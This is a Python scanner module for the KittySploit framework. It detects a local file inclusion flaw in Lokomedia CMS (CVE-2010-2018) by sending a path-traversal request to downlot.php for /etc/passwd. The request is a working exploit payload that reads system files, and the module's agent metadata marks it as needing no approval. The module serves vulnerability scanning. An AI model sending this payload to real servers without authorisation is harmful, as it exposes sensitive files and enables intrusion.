#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A Local File Inclusion (LFI) vulnerability exists in Lokomedia CMS."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Lokomedia CMS - Local File Inclusion Detection',
        'description': 'A Local File Inclusion (LFI) vulnerability exists in Lokomedia CMS. The application allows an attacker to include files on the server that should not be accessible, potentially exposing sensitive information.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'lfi', 'lokomedia', 'cms', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cxsecurity.com/issue/WLB-2018070116',
            'https://github.com/kangkuswae/CMS-Lokomedia',
            'https://nvd.nist.gov/vuln/detail/CVE-2010-2018',
        ],
        'cve': 'CVE-2010-2018',
    }

    def run(self):
        r = self.http_request(method="GET", path='/downlot.php?file=../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/proses',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Lokomedia CMS - Local File Inclusion detected",
                path='/downlot.php?file=../../../../../../../../../../etc/passwd',
            )
            return True
        return False

